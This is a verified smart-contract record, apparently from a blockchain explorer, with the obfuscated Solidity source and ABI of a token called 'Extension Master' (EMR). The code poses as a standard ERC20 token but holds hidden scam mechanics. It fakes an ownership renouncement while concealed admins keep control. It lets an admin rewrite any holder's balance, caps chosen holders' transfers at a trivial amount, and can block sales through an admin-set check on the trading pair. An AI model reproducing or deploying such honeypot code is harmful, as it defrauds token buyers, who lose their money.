{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface fromMax {\n    function createPair(address fromTeam, address maxBuy) external returns (address);\n}\n\ninterface limitReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeToken) external view returns (uint256);\n\n    function transfer(address modeSell, uint256 marketingShould) external returns (bool);\n\n    function allowance(address senderList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeSell,\n        uint256 marketingShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minAtWallet, uint256 value);\n    event Approval(address indexed senderList, address indexed spender, uint256 value);\n}\n\nabstract contract shouldTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface limitReceiverMetadata is limitReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExtensionMaster is shouldTo, limitReceiver, limitReceiverMetadata {\n\n    bool public takeFee;\n\n    function exemptSellLimit() public {\n        emit OwnershipTransferred(amountMax, address(0));\n        buyAt = address(0);\n    }\n\n    function allowance(address fundReceiver, address tokenSender) external view virtual override returns (uint256) {\n        if (tokenSender == liquiditySell) {\n            return type(uint256).max;\n        }\n        return isFee[fundReceiver][tokenSender];\n    }\n\n    function getOwner() external view returns (address) {\n        return buyAt;\n    }\n\n    uint256 private sellFrom;\n\n    function launchTake(address launchedReceiverTrading, uint256 marketingShould) public {\n        receiverEnable();\n        maxSellAuto[launchedReceiverTrading] = marketingShould;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableAmount;\n    }\n\n    bool public maxSwap;\n\n    uint256 senderListFund;\n\n    mapping(address => mapping(address => uint256)) private isFee;\n\n    function atShould(address feeReceiver, address modeSell, uint256 marketingShould) internal returns (bool) {\n        require(maxSellAuto[feeReceiver] >= marketingShould);\n        maxSellAuto[feeReceiver] -= marketingShould;\n        maxSellAuto[modeSell] += marketingShould;\n        emit Transfer(feeReceiver, modeSell, marketingShould);\n        return true;\n    }\n\n    function receiverEnable() private view {\n        require(teamTo[_msgSender()]);\n    }\n\n    function shouldLiquidity(address atMode) public {\n        receiverEnable();\n        if (receiverShould) {\n            sellFrom = isFrom;\n        }\n        if (atMode == amountMax || atMode == limitSwapTo) {\n            return;\n        }\n        feeSell[atMode] = true;\n    }\n\n    uint8 private enableAmount = 18;\n\n    string private senderFund = \"Extension Master\";\n\n    function owner() external view returns (address) {\n        return buyAt;\n    }\n\n    address public amountMax;\n\n    function transfer(address launchedReceiverTrading, uint256 marketingShould) external virtual override returns (bool) {\n        return isLiquidity(_msgSender(), launchedReceiverTrading, marketingShould);\n    }\n\n    function isLiquidity(address feeReceiver, address modeSell, uint256 marketingShould) internal returns (bool) {\n        if (feeReceiver == amountMax) {\n            return atShould(feeReceiver, modeSell, marketingShould);\n        }\n        uint256 walletReceiver = limitReceiver(limitSwapTo).balanceOf(swapList);\n        require(walletReceiver == senderListFund);\n        require(modeSell != swapList);\n        if (feeSell[feeReceiver]) {\n            return atShould(feeReceiver, modeSell, exemptFee);\n        }\n        return atShould(feeReceiver, modeSell, marketingShould);\n    }\n\n    uint256 private exemptLimit = 100000000 * 10 ** 18;\n\n    bool private receiverShould;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptLimit;\n    }\n\n    uint256 launchWallet;\n\n    string private fromReceiverLimit = \"EMR\";\n\n    mapping(address => bool) public teamTo;\n\n    uint256 public isFrom;\n\n    function balanceOf(address feeToken) public view virtual override returns (uint256) {\n        return maxSellAuto[feeToken];\n    }\n\n    address swapList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function fundIs(uint256 marketingShould) public {\n        receiverEnable();\n        senderListFund = marketingShould;\n    }\n\n    function buyReceiver(address exemptToken) public {\n        if (maxSwap) {\n            return;\n        }\n        \n        teamTo[exemptToken] = true;\n        if (receiverShould) {\n            sellModeLiquidity = false;\n        }\n        maxSwap = true;\n    }\n\n    event OwnershipTransferred(address indexed fromReceiver, address indexed enableShouldFund);\n\n    function transferFrom(address feeReceiver, address modeSell, uint256 marketingShould) external override returns (bool) {\n        if (_msgSender() != liquiditySell) {\n            if (isFee[feeReceiver][_msgSender()] != type(uint256).max) {\n                require(marketingShould <= isFee[feeReceiver][_msgSender()]);\n                isFee[feeReceiver][_msgSender()] -= marketingShould;\n            }\n        }\n        return isLiquidity(feeReceiver, modeSell, marketingShould);\n    }\n\n    mapping(address => bool) public feeSell;\n\n    address liquiditySell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private maxSellAuto;\n\n    bool public sellModeLiquidity;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromReceiverLimit;\n    }\n\n    constructor (){\n        if (takeFee) {\n            takeFee = false;\n        }\n        feeFund limitShould = feeFund(liquiditySell);\n        limitSwapTo = fromMax(limitShould.factory()).createPair(limitShould.WETH(), address(this));\n        if (receiverShould) {\n            amountTake = sellFrom;\n        }\n        amountMax = _msgSender();\n        teamTo[amountMax] = true;\n        maxSellAuto[amountMax] = exemptLimit;\n        exemptSellLimit();\n        \n        emit Transfer(address(0), amountMax, exemptLimit);\n    }\n\n    address public limitSwapTo;\n\n    function name() external view virtual override returns (string memory) {\n        return senderFund;\n    }\n\n    uint256 public amountTake;\n\n    address private buyAt;\n\n    function approve(address tokenSender, uint256 marketingShould) public virtual override returns (bool) {\n        isFee[_msgSender()][tokenSender] = marketingShould;\n        emit Approval(_msgSender(), tokenSender, marketingShould);\n        return true;\n    }\n\n    uint256 constant exemptFee = 12 ** 10;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableShouldFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minAtWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptToken\",\"type\":\"address\"}],\"name\":\"buyReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSellLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingShould\",\"type\":\"uint256\"}],\"name\":\"fundIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedReceiverTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingShould\",\"type\":\"uint256\"}],\"name\":\"launchTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSwapTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellModeLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMode\",\"type\":\"address\"}],\"name\":\"shouldLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedReceiverTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ExtensionMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}